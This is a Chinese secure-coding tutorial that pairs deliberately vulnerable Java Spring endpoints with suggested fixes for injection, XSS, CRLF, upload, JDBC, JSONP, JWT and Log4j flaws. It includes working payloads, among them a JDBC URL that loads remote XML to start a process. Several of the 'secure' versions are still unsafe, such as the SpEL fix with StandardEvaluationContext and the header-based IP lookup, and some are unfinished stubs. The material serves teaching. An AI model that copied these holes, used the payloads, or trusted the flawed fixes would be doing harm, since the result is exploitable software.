序列化漏洞通常由于未对反序列化的输入进行适当的验证和过滤而产生。攻击者可以构造恶意的序列化数据，并将其传递给应用程序，而应用程序在反序列化时没有充分验证这些输入。 执行恶意代码： 恶意序列化数据中可能包含恶意代码，这些代码在应用程序内执行。攻击者的目标是通过这种方式执行不受信任的操作，例如执行系统命令、绕过身份验证、修改数据等。 攻击场景： 一种常见的攻击场景是通过篡改网络通信中的序列化数据来注入恶意代码。攻击者可以利用这种漏洞来执行远程代码，绕过应用程序的安全机制。 防范序列化漏洞的措施包括： 验证和过滤输入： 在反序列化过程中，对输入数据进行严格的验证和过滤，确保它是合法和受信任的。可以使用白名单机制，只接受特定类型的对象。 沙盒执行： 在反序列化时，可以考虑在沙盒环境中执行代码，以限制恶意代码的影响范围。 安全的序列化库： 使用经过安全审查的序列化库，这些库通常会提供更好的安全性和对恶意序列化数据的防护。 禁用不必要的序列化： 避免对不必要的对象进行序列化，减少攻击面。 总体而言，序列化漏洞是一种需要谨慎处理的安全问题，因为它可能导致执行未经授权的代码。在开发和维护应用程序时，应该采取适当的安全措施，以防范和修复潜在的序列化漏洞。 RCERCE漏洞是指远程命令执行（Remote Command Execution）漏洞，它是一种安全漏洞类型，使攻击者能够通过远程方式执行任意系统命令，从而获得未经授权的访问权限和对目标系统的控制权。 cmd注入 cmd代码注入 敏感方法12Process p = run.exec(cmd);ProcessBuilder processBuilder = new ProcessBuilder(cmd); 漏洞代码12345678910111213141516 @GetMapping(&quot;/runtime/exec&quot;) public String CommandExec(String cmd) &#123;... //未对cmd参数进行过滤直接交给执行器执行，存在代码注入风险； //可使用ProcessBuilder.command(&quot;Str1&quot;, &quot;Str2&quot;...)来实现安全执行； Process p = run.exec(cmd);... &#125; @GetMapping(&quot;/ProcessBuilder&quot;) public String processBuilder(String cmd) &#123;... String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);... &#125; 安全代码1234567891011121314@GetMapping(&quot;/runtime/exec&quot;)@GetMapping(&quot;/ProcessBuilder&quot;)public String CommandExec(String cmd) &#123; // 进行输入验证和过滤，确保只允许特定的命令格式 if (isValidCommand(cmd)) &#123; ... Process p = processBuilder.start(); BufferedReader inBr = new BufferedReader(new InputStreamReader(p.getInputStream())); ... &#125; else &#123; // 处理非法的命令输入 throw new IllegalArgumentException(&quot;Invalid command&quot;); &#125;&#125; js脚本注入 远程js脚本注入 敏感方法1ScriptEngine.eval(Str, Bindings) 漏洞代码123456789// 由于它直接使用用户提供的jsurl参数来构造JavaScript代码，并通过ScriptEngine执行该代码。这可能导致以下安全问题 @GetMapping(&quot;/jscmd&quot;) public void jsEngine(String jsurl) throws Exception&#123; // js nashorn javascript ecmascript ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;); Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE); String cmd = String.format(&quot;load(\\&quot;%s\\&quot;)&quot;, jsurl); engine.eval(cmd, bindings); &#125; 安全代码1234567891011121314151617181920212223242526@GetMapping(&quot;/jscmd&quot;)public void jsEngine(String jsurl) throws Exception &#123; // 进行输入验证和过滤，确保只接受合法且可信的URL if (isValidUrl(jsurl)) &#123; // 使用安全的JavaScript引擎，如GraalVM的JavaScript引擎 JavaScriptEngine engine = createSecureJavaScriptEngine(); try (InputStream inputStream = new URL(jsurl).openStream()) &#123; // 在沙盒环境中执行脚本 engine.eval(new InputStreamReader(inputStream)); &#125; &#125; else &#123; // 处理非法的URL输入 throw new IllegalArgumentException(&quot;Invalid URL&quot;); &#125;&#125;private boolean isValidUrl(String url) &#123; // 进行 URL 合法性验证，例如使用正则表达式或白名单机制 // 返回 true 表示 URL 合法，否则返回 false // 示例：return url.matches(&quot;^https?://(www\\\\.)?[a-zA-Z0-9]+\\\\.[a-zA-Z]&#123;2,&#125;\\\\S*$&quot;);&#125;private JavaScriptEngine createSecureJavaScriptEngine() &#123; // 创建安全的JavaScript引擎，如GraalVM的JavaScript引擎 // 可以配置安全策略、访问限制等来提供更好的隔离和安全控制&#125; yaml注入敏感方法1Yaml.load(String) 漏洞代码12345@GetMapping(&quot;/vuln/yarm&quot;)public void yarm(String content) &#123; Yaml y = new Yaml(); y.load(content);&#125; 安全代码12345678910111213141516171819202122232425262728293031323334@GetMapping(&quot;/sec/yarm&quot;)public void secYarm(String content) &#123; Yaml y = new Yaml(new SafeConstructor()); y.load(content);&#125;@GetMapping(&quot;/vuln/yarm&quot;)public void yarm(String content) &#123; // 进行输入验证和过滤，确保只接受合法且预期的YAML格式 if (isValidYaml(content)) &#123; // 使用安全的YAML解析库，如SnakeYAML Yaml yaml = createSecureYamlParser(); // 加载并处理YAML数据 Object data = yaml.load(content); // 进一步处理数据... &#125; else &#123; // 处理非法的YAML输入 throw new IllegalArgumentException(&quot;Invalid YAML&quot;); &#125;&#125;private boolean isValidYaml(String content) &#123; // 进行YAML合法性验证，例如使用正则表达式或白名单机制 // 返回 true 表示YAML合法，否则返回 false // 示例：return content.matches(&quot;^[- a-zA-Z0-9]+$&quot;);&#125;private Yaml createSecureYamlParser() &#123; // 创建安全的YAML解析库，如SnakeYAML // 可以配置安全策略、访问限制等来提供更好的隔离和安全控制&#125; groovyshell注入敏感方法1GroovyShell.evaluate(content); 漏洞代码123456@GetMapping(&quot;groovy&quot;) public void groovyshell(String content) &#123; GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(content); &#125; 安全代码12345678910111213141516171819@GetMapping(&quot;groovy&quot;)public void groovyshell(@RequestParam String content) &#123; // 验证和过滤用户输入，确保只有受信任的内容被传递给GroovyShell if (isValidContent(content)) &#123; GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(content); &#125; else &#123; // 处理非法输入，可以记录日志、抛出异常或采取其他适当的措施 handleInvalidContent(); &#125;&#125;private boolean isValidContent(String content) &#123; // 实现验证逻辑，例如检查内容是否符合预期的格式或结构 // 可以使用正则表达式、白名单、黑名单等进行验证 // 返回true表示内容有效，可以传递给GroovyShell；返回false表示内容无效，需要处理 // 这里只是一个示例，实际情况根据具体需求进行实现 return content.matches(&quot;[a-zA-Z0-9_]+&quot;);&#125; SpEL SpEL（Spring Expression Language）是Spring框架中的一种表达式语言，它提供了在运行时对对象图进行查询和操作的强大的表达式语言。SpEL主要用于处理Spring框架中的配置文件，如XML和注解中的属性值，以及在运行时进行动态计算和处理。 敏感函数12ExpressionParser parser = new SpelExpressionParser();Expression vulnExpression = parser.parseExpression(expression); 漏洞代码123456789@GetMapping(&quot;/spel/vuln&quot;)public String rce(String expression) &#123; ExpressionParser parser = new SpelExpressionParser(); // fix method: SimpleEvaluationContext Expression vulnExpression = parser.parseExpression(expression); Object value = vulnExpression.getValue(); String s = value.toString(); return s;&#125; 安全代码123456789101112131415161718192021222324252627282930313233import org.springframework.expression.Expression;import org.springframework.expression.ExpressionParser;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.expression.spel.support.StandardEvaluationContext;@GetMapping(&quot;/spel/secure&quot;)public String secureRCE(String expression) &#123; try &#123; // 创建一个安全的评估上下文 StandardEvaluationContext context = new StandardEvaluationContext(); // 在评估上下文中添加需要暴露给表达式的安全对象 // 例如，如果允许访问特定的方法，应将这些方法添加到上下文中 // context.setVariable(&quot;myObject&quot;, myObject); // 使用安全的评估上下文解析表达式 ExpressionParser parser = new SpelExpressionParser(); Expression secureExpression = parser.parseExpression(expression); Object value = secureExpression.getValue(context); // 确保返回值是安全的，避免可能的安全风险 if (value != null) &#123; String result = value.toString(); return result; &#125; else &#123; return &quot;Expression result is null.&quot;; &#125; &#125; catch (Exception e) &#123; // 捕获任何异常，防止漏洞被滥用 return &quot;Error executing expression.&quot;; &#125;&#125; Cookie敏感方法12String nick = WebUtils.getCookieValueByName(req, NICK); // key codereturn &quot;Cookie nick: &quot; + nick; 漏洞代码12345@GetMapping(value = &quot;/vuln01&quot;)public String vuln01(HttpServletRequest req) &#123; String nick = WebUtils.getCookieValueByName(req, NICK); // key code return &quot;Cookie nick: &quot; + nick;&#125; 代码直接通过WebUtils.getCookieValueByName方法获取Cookie的值，但没有对该值进行验证。如果恶意用户能够操控Cookie的内容，可能会导致安全问题。 Cookie欺骗攻击： 恶意用户可能会通过伪造或修改Cookie来冒充其他用户，获取其权限或执行未经授权的操作。 XSS（跨站脚本攻击）： 如果Cookie中包含未经转义的用户输入，攻击者可能通过注入恶意脚本来执行跨站脚本攻击。 XSS（跨站脚本攻击）的潜在风险主要来自于返回给浏览器的字符串拼接，尤其是在输出用户提供的数据时，如nick的值。如果nick包含恶意的脚本代码，这些脚本代码可能会在浏览器中执行，导致安全问题。 在这个例子中，XSS注入攻击的一个可能的方式是通过设置恶意的Cookie值，使其包含脚本代码。例如，攻击者可以通过在Cookie中设置以下值来注入脚本： 1&lt;script&gt;alert(&#x27;XSS Attack&#x27;);&lt;/script&gt; 如果nick的值直接在返回的字符串中使用，那么这段恶意脚本将在浏览器中执行，弹出一个对话框，从而实现XSS攻击。 为了防范XSS攻击，你应该对输出进行适当的转义，确保任何用户提供的数据都不会被解释为HTML或JavaScript代码。在Spring框架中，你可以使用Thymeleaf等模板引擎来进行自动转义，或者使用HtmlUtils类手动转义。 安全代码12345678910111213@GetMapping(value = &quot;/secure&quot;) // 使用@CookieValue注解直接获取Cookie的值，并设置默认值为空字符串，通过这种方式避免直接从HttpServletRequest中获取Cookie值从而造成的安全问题；public String secureEndpoint(@CookieValue(value = NICK, defaultValue = &quot;&quot;) String nick) &#123; //isValidNick方法将对Cookie值进行验证，确保其符合预期的格式或结构； if (isValidNick(nick)) &#123; // 执行安全的操作，例如将Cookie值用于业务逻辑 // 使用了HtmlUtils.htmlEscape方法对nick进行HTML转义，确保任何特殊字符都被转义，从而防止它们被解释为脚本。这样可以有效地防范XSS攻击。 return &quot;Cookie nick: &quot; + HtmlUtils.htmlEscape(nick); &#125; else &#123; // 处理无效的Cookie值，可以记录日志、抛出异常或者采取其他适当的措施 return &quot;Invalid Cookie&quot;; &#125;&#125; CRLFCRLF漏洞（Carriage Return Line Feed漏洞）是一种安全漏洞，涉及到处理换行符（Carriage Return和Line Feed）时的不正确验证。这类漏洞通常发生在Web应用程序中，攻击者通过在用户提供的输入中插入恶意的换行符，来执行一些意外的操作或绕过一些安全控制。 具体来说，CRLF漏洞通常涉及到在HTTP头或其他协议头中注入换行符，从而影响到头的解析和处理。攻击者可以尝试在这些头中插入CRLF序列，以触发一些不受控制的行为。 举例：http-get 123GET /vulnerable-endpoint HTTP/1.1Host: example.comUser-Agent: Mozilla/5.0\\r\\nInjectedHeader: MaliciousPayload\\r\\nSet-Cookie: session=attacker-controlled\\r\\n\\r\\n User-Agent头中插入了CRF序列，成功地添加了一个名为InjectedHeader的恶意头，并在其中插入了Set-Cookie头，将session的值设置为attacker-controlled。 为防范CRLF漏洞，开发者应该在处理用户输入时进行适当的验证和过滤，确保不会将未经处理的换行符插入到协议头中。此外，对于协议头的解析和处理，也应该进行严格的规范验证，以防止不正确的解析。在代码层面，可以使用一些Web安全库或框架，以减少这类漏洞的风险。 漏洞代码123456789@RequestMapping(&quot;/safecode&quot;)@ResponseBodypublic void crlf(HttpServletRequest request, HttpServletResponse response) &#123; response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;)); response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;)); String author = request.getParameter(&quot;test3&quot;); Cookie cookie = new Cookie(&quot;test3&quot;, author); response.addCookie(cookie);&#125; HTTP响应拆分： 通过注入CRLF序列，攻击者可以在HTTP响应头中添加额外的内容，绕过应用程序的预期响应，可能导致HTTP响应拆分攻击。 Cookie注入攻击： 通过在test3参数中注入CRLF序列，攻击者可以尝试注入额外的Cookie头，从而实现Cookie注入攻击，劫持用户会话。 安全代码1234567891011121314151617181920@RequestMapping(&quot;/securecode&quot;)@ResponseBodypublic void secureCRLF(HttpServletRequest request, HttpServletResponse response) &#123; String test1 = sanitizeInput(request.getParameter(&quot;test1&quot;)); String test2 = sanitizeInput(request.getParameter(&quot;test2&quot;)); String test3 = sanitizeInput(request.getParameter(&quot;test3&quot;)); response.addHeader(&quot;test1&quot;, test1); response.setHeader(&quot;test2&quot;, test2); // 此处需要确保test3的值符合Cookie的安全规范 Cookie cookie = new Cookie(&quot;test3&quot;, test3); response.addCookie(cookie);&#125;private String sanitizeInput(String input) &#123; // 对输入进行适当的验证和过滤，确保不包含恶意的CRLF序列 // 这可以使用白名单、正则表达式等来实现 // 返回处理 Fastjson Fastjson · JoyChou93&#x2F;java-sec-code Wiki (github.com) 文件上传敏感方法123byte[] bytes = file.getBytes();Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());Files.write(path, bytes); 漏洞代码12345678910111213141516171819202122232425@PostMapping(&quot;/upload&quot;)public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file, RedirectAttributes redirectAttributes) &#123; if (file.isEmpty()) &#123; // 赋值给uploadStatus.html里的动态参数message redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;); return &quot;redirect:/file/status&quot;; &#125; try &#123; // Get the file and save it somewhere byte[] bytes = file.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename()); Files.write(path, bytes); redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;You successfully uploaded &#x27;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#x27;&quot;); &#125; catch (IOException e) &#123; redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;); logger.error(e.toString()); &#125; return &quot;redirect:/file/status&quot;;&#125; 安全代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118 @PostMapping(&quot;/upload/picture&quot;) @ResponseBody public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123; if (multifile.isEmpty()) &#123; return &quot;Please select a file to upload&quot;; &#125; String fileName = multifile.getOriginalFilename(); String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名 String mimeType = multifile.getContentType(); // 获取MIME类型 String filePath = UPLOADED_FOLDER + fileName; File excelFile = convert(multifile); //文件 // 判断文件后缀名是否在白名单内 校验1 String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;; boolean suffixFlag = false; for (String white_suffix : picSuffixList) &#123; if (Suffix.toLowerCase().equals(white_suffix)) &#123; suffixFlag = true; break; &#125; &#125; if (!suffixFlag) &#123; logger.error(&quot;[-] Suffix error: &quot; + Suffix); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; &#125; // 判断MIME类型是否在黑名单内 校验2 String[] mimeTypeBlackList = &#123; &quot;text/html&quot;, &quot;text/javascript&quot;, &quot;application/javascript&quot;, &quot;application/ecmascript&quot;, &quot;text/xml&quot;, &quot;application/xml&quot; &#125;; for (String blackMimeType : mimeTypeBlackList) &#123; // 用contains是为了防止text/html;charset=UTF-8绕过 if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123; logger.error(&quot;[-] Mime type error: &quot; + mimeType); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; &#125; &#125; // 判断文件内容是否是图片 校验3 boolean isImageFlag = isImage(excelFile); deleteFile(randomFilePath); if (!isImageFlag) &#123; logger.error(&quot;[-] File is not Image&quot;); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; &#125; try &#123; // Get the file and save it somewhere byte[] bytes = multifile.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename()); Files.write(path, bytes); &#125; catch (IOException e) &#123; logger.error(e.toString()); deleteFile(filePath); return &quot;Upload failed&quot;; &#125; logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType); logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath); return String.format(&quot;You successfully uploaded &#x27;%s&#x27;&quot;, filePath); &#125; private void deleteFile(String filePath) &#123; File delFile = new File(filePath); if(delFile.isFile() &amp;&amp; delFile.exists()) &#123; if (delFile.delete()) &#123; logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;); return; &#125; &#125; logger.info(filePath + &quot; delete failed!&quot;); &#125; /** * 为了使用ImageIO.read() * * 不建议使用transferTo，因为原始的MultipartFile会被覆盖 * https://stackoverflow.com/questions/24339990/how-to-convert-a-multipart-file-to-file */ private File convert(MultipartFile multiFile) throws Exception &#123; String fileName = multiFile.getOriginalFilename(); String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); UUID uuid = Generators.timeBasedGenerator().generate(); randomFilePath = UPLOADED_FOLDER + uuid + suffix; // 随机生成一个同后缀名的文件 File convFile = new File(randomFilePath); boolean ret = convFile.createNewFile(); if (!ret) &#123; return null; &#125; FileOutputStream fos = new FileOutputStream(convFile); fos.write(multiFile.getBytes()); fos.close(); return convFile; &#125; /** * Check if the file is a picture. */ private static boolean isImage(File file) throws IOException &#123; BufferedImage bi = ImageIO.read(file); return bi != null; &#125;&#125; 通过白名单根据文件后缀进行过滤； 1234567891011121314// 判断文件后缀名是否在白名单内 校验1 String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;; boolean suffixFlag = false; for (String white_suffix : picSuffixList) &#123; if (Suffix.toLowerCase().equals(white_suffix)) &#123; suffixFlag = true; break; &#125; &#125; if (!suffixFlag) &#123; logger.error(&quot;[-] Suffix error: &quot; + Suffix); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; &#125; 通过黑名单根据MIME类型进行过滤； 1234567891011121314151617// 判断MIME类型是否在黑名单内 校验2String[] mimeTypeBlackList = &#123; &quot;text/html&quot;, &quot;text/javascript&quot;, &quot;application/javascript&quot;, &quot;application/ecmascript&quot;, &quot;text/xml&quot;, &quot;application/xml&quot; &#125;; for (String blackMimeType : mimeTypeBlackList) &#123; // 用contains是为了防止text/html;charset=UTF-8绕过 if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123; logger.error(&quot;[-] Mime type error: &quot; + mimeType); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; &#125; &#125; 判断文件内容是否为图片； 1234private static boolean isImage(File file) throws IOException &#123; BufferedImage bi = ImageIO.read(file); return bi != null;&#125; IP地址获取敏感方法12request.getRemoteAddr();request.getHeader(&quot;X-Real-IP&quot;); 漏洞代码12345678910111213141516171819@RequestMapping(&quot;/noproxy&quot;)public static String noProxy(HttpServletRequest request) &#123; return request.getRemoteAddr();&#125;@RequestMapping(&quot;/proxy&quot;)@ResponseBodypublic static String proxy(HttpServletRequest request) &#123; String ip = request.getHeader(&quot;X-Real-IP&quot;); if (StringUtils.isNotBlank(ip)) &#123; return ip; &#125; else &#123; String remoteAddr = request.getRemoteAddr(); if (StringUtils.isNotBlank(remoteAddr)) &#123; return remoteAddr; &#125; &#125; return &quot;&quot;;&#125; 安全代码12345678910111213141516171819202122232425262728import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;@RequestMapping(&quot;/secured&quot;)public static String securedEndpoint() &#123; // 获取请求对象 HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest(); // 获取真实的客户端IP地址 /*ClientIp获取顺序： 1. [HTTP HEAD]X-Forwarded-For 2. [HTTP HEAD]Proxy-Client-IP 3. [HTTP HEAD]WL-Proxy-Client-IP 4. request.getRemoteAddr(); */ String clientIp = request.getHeader(&quot;X-Forwarded-For&quot;); if (clientIp == null || clientIp.isEmpty() || &quot;unknown&quot;.equalsIgnoreCase(clientIp)) &#123; clientIp = request.getHeader(&quot;Proxy-Client-IP&quot;); &#125; if (clientIp == null || clientIp.isEmpty() || &quot;unknown&quot;.equalsIgnoreCase(clientIp)) &#123; clientIp = request.getHeader(&quot;WL-Proxy-Client-IP&quot;); &#125; if (clientIp == null || clientIp.isEmpty() || &quot;unknown&quot;.equalsIgnoreCase(clientIp)) &#123; clientIp = request.getRemoteAddr(); &#125; return clientIp;&#125; jdbc-postgresql敏感函数1DriverManager.getConnection(jdbcUrl); 漏洞代码1234567@RequestMapping(&quot;/postgresql&quot;)public void postgresql(String jdbcUrlBase64) throws Exception&#123; byte[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64); String jdbcUrl = new String(b); log.info(jdbcUrl); DriverManager.getConnection(jdbcUrl);&#125; Payload123456789101112POST /jdbc/postgresql HTTP/1.1Host: sb.dog:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fr;q=0.6Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 238jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA== base64解码1jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://test.joychou.org/1.xml 1.xml12345678910111213141516&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;exec&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;open&lt;/value&gt; &lt;value&gt;-a&lt;/value&gt; &lt;value&gt;calculator&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 修复升级postgresql版本到42.3.2及以上。 jsonp浏览器同源策略就是，A⽹站只能访问A⽹站数据，B⽹站只能访问B⽹站数据，AB不能互相访问数据。JSONP（JSON with Padding）是一种用于解决浏览器跨域请求的技术。由于同源策略的限制，浏览器通常阻止页面发起跨域请求。JSONP通过动态创建 &lt;script&gt; 标签的方式来绕过这一限制，从而实现跨域数据传输。 理解：注意，这里的跨域是指，当前访问a域名（a.domain.com）加载得到的前端页面，在a域名的前端页面中访问b域名（b.domain.com）的数据，故称之为跨域。 jsonp工作原理 客户端（浏览器）在页面中动态创建一个 &lt;script&gt; 标签，并设置其 src 属性指向包含 JSON 数据的资源，同时通过查询字符串或路径参数将回调函数名传递给服务器。 123456789// 回调函数function handleData(data) &#123; console.log(&quot;Received data:&quot;, data);&#125;// script代码，在其中指明需要由a域名访问到的b域名资源地址var script = document.createElement(&quot;script&quot;);script.src = &quot;https://example-api.com/data?callback=handleData&quot;;document.body.appendChild(script); 服务器根据接收到的回调函数名，将 JSON 数据包装在该回调函数中，返回给客户端。 1234567891011function fetchDataFromDatabase() &#123; // 从数据库获取数据的示例 return &#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 25&#125;;&#125;//得到回调函数名称var callbackName = req.query.callback;//获得所需的json数据var jsonData = fetchDataFromDatabase();//返回json格式的数据，其中包含一段可执行的函数（脚本）res.send(callbackName + &#x27;(&#x27; + JSON.stringify(jsonData) + &#x27;)&#x27;); 浏览器加载由服务器返回的脚本，并执行其中的 JavaScript 代码。这个脚本包含了客户端定义的回调函数，以及在这个回调函数中调用的实际数据。 1handleData(&#123;&quot;name&quot;:&quot;John&quot;, &quot;age&quot;: 25&#125;) jsonp漏洞利用敏感函数123String callback = request.getParameter(this.callback);String userInfo2JsonStr = LoginUtils.getUserInfo2JsonStr(request);String json2Jsonp = WebUtils.json2Jsonp(callback, userInfo2JsonStr); 漏洞代码12345678910111213141516171819@RequestMapping(value = &quot;/vuln/referer&quot;, produces = &quot;application/javascript&quot;)public String referer(HttpServletRequest request) &#123; //this.callback = businessCallback String callback = request.getParameter(this.callback); String userInfo2JsonStr = LoginUtils.getUserInfo2JsonStr(request); String json2Jsonp = WebUtils.json2Jsonp(callback, userInfo2JsonStr); return json2Jsonp;&#125; @RequestMapping(value = &quot;/vuln/emptyReferer&quot;, produces = &quot;application/javascript&quot;)public String emptyReferer(HttpServletRequest request) &#123; String referer = request.getHeader(&quot;referer&quot;); if (null != referer &amp;&amp; SecurityUtil.checkURL(referer) == null) &#123; return &quot;error&quot;; &#125; String callback = request.getParameter(this.callback); return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));&#125; 安全代码123456789101112131415161718192021222324252627@RequestMapping(value = &quot;/sec/checkReferer&quot;, produces = &quot;application/javascript&quot;)public String safecode(HttpServletRequest request) &#123; String referer = request.getHeader(&quot;referer&quot;); if (SecurityUtil.checkURL(referer) == null) &#123; return &quot;error&quot;; &#125; String callback = request.getParameter(this.callback); if (isValidCallback(callback)) &#123; return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request)); &#125; else &#123; // 处理非法回调函数名的情况 return &quot;Invalid callback function name&quot;; &#125; private boolean isValidCallback(String callback) &#123; // 实现合法性验证的逻辑，例如检查是否是合法的标识符 // 返回 true 表示合法，返回 false 表示非法 &#125; String callback = request.getParameter(this.callback); return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));&#125; jwt JWT（JSON Web Token）是一种用于在网络上安全地将声明传输的开放标准（RFC 7519）。它通常用于在身份验证和信息交换方面进行跨域通信。JWT 是一个紧凑的、自包含的方式，它可以在不同系统之间安全地传递信息。JWT 使用 JSON 对象进行编码，这使得它易于理解和处理。 尽管 JSON Web Tokens (JWT) 是一种流行的身份验证和授权解决方案，但它们在使用中仍然可能受到一些安全漏洞的影响。以下是一些可能存在的 JWT 漏洞和安全问题： 未加密的令牌： 问题描述： JWT 默认情况下是未加密的，只进行签名，因此其内容可以被 Base64 解码并查看。敏感信息可能会暴露给攻击者。 解决方案： 对于敏感信息，应该使用加密算法（JWE）对 JWT 进行加密，以确保内容的机密性。 签名算法选择不当： 问题描述： 选择弱签名算法或者使用服务器端共享的密钥，可能使得攻击者更容易伪造有效的 JWT。 解决方案： 选择强大的签名算法，例如 RS256，并确保服务器端的密钥保密。 过期时间未验证： 问题描述： 如果不检查 JWT 中的过期时间（exp 声明），攻击者可能会利用过期的 JWT 进行访问。 解决方案： 在服务器端验证 JWT 中的过期时间，并在过期后拒绝使用该令牌。 不足够的权限验证： 问题描述： JWT 中的声明（claims）可能包含用户的角色或权限信息，但服务器端需要确保适当地验证这些信息。 解决方案： 在服务器端进行适当的权限验证，不仅仅依赖于 JWT 中的声明。 重放攻击（Replay Attacks）： 问题描述： 攻击者可能复用有效 JWT，尝试进行重放攻击。 解决方案： 使用单次使用（One-Time Use）的 JWT 或在服务器端维护 JWT 的使用记录。 CSRF（Cross-Site Request Forgery）： 问题描述： 如果未采取适当的措施，攻击者可能通过 CSRF 攻击获取用户的 JWT。 解决方案： 使用安全措施，如同源检查（SameSite Cookie Attribute）来防止 CSRF。 信息泄露： 问题描述： JWT 中的信息可能会被泄露给第三方，尤其是在分布式系统中传递 JWT 时。 解决方案： 避免在 JWT 中存储敏感信息，或者使用适当的加密来保护信息。 漏洞代码123456789101112131415161718@GetMapping(&quot;/createToken&quot;)public String createToken(HttpServletResponse response, HttpServletRequest request) &#123; //此处未能对User_name做充分的验证，应该通过数据库匹配等方式充分验证该用户信息的真实性； String loginUser = request.getUserPrincipal().getName(); log.info(&quot;Current login user is &quot; + loginUser); CookieUtils.deleteCookie(response, COOKIE_NAME); String token = JwtUtils.generateTokenByJavaJwt(loginUser); Cookie cookie = new Cookie(COOKIE_NAME, token); cookie.setMaxAge(86400); // 1 DAY cookie.setPath(&quot;/&quot;); cookie.setSecure(true); response.addCookie(cookie); //还应该设置cookie.setHttpOnly(true)：设置 Cookie 时，应该同时设置 HttpOnly 属性，以防止通过 JavaScript 访问 Cookie。 return &quot;Add jwt token cookie successfully. Cookie name is USER_COOKIE&quot;;&#125; Log4jCVE-2021-44228（Log4Shell）： 漏洞描述： 这是一个严重的安全漏洞，存在于Log4j 2的JNDI注入问题。攻击者可以通过构造恶意的日志事件触发JNDI查询，从而导致远程代码执行。 受影响的版本： 受影响的版本主要包括2.0-beta9至2.14.1之间的版本。较新的版本可能也受到影响，具体取决于特定的配置。 解决方法： 修复此漏洞的推荐方法是升级Log4j到2.15.0或更高版本。此外，可以通过配置Log4j以防止触发JNDI查询来缓解漏洞的影响。 JNDI（Java Naming and Directory Interface）是Java平台上用于访问命名和目录服务的API。 漏洞执行过程： 攻击者构造恶意Payload： 攻击者通过特定的Log4j日志事件中的Payload，构造一个恶意的JNDI查询。Payload中包含了恶意的JNDI地址，这是攻击的关键部分。 日志事件触发： 